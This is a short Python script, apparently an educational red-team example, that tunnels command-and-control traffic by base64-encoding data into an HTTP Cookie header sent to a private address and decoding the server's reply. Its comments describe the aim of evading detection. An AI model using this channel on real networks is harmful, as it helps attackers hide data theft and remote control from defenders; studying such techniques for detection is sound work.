# This script emplaces an encoded piece of data into an HTTP cookie, which might help evade detection,
# because data is often obscured with encoding in that area of an HTTP transaction.
# To make the tunneling more effective, the request would have to mimic an actual HTTP transaction more closely, and the URL would have to change.

import requests
# Python's requests library is its HTTP client and handler.
from base64 import b64encode,b64decode

def C2(url,data):
    response = requests.get(url,headers={'Cookie': b64encode(data)})
    print(b64decode(response.content))

url = "http://10.10.10.8:8443"
data = bytes("C2 data","utf-8")
C2(url,data)
